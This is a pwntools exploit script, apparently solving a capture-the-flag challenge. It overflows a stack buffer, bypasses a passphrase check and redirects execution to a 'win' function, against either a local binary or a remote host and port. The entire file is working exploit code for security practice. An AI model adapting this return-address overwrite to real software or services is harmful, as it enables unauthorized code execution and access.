#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./chall')
context.terminal = ['alacritty', '-e']

if args.REMOTE:
    io = remote("84.201.137.163", 10186)
else:
    io = process()

io.sendlineafter(b': ', b'-1')

ret = 0x0000000000400641
win = 0x00400816

payload = b'A' * 15 + b'\x00' # overflow buffer
payload += b'A'* 15 + b'\x00' # overflow passphrase to pass check
payload += b'A'*24
payload += pack(ret)
payload += pack(win)

io.sendlineafter(b': ', payload)
io.interactive()
io.close()
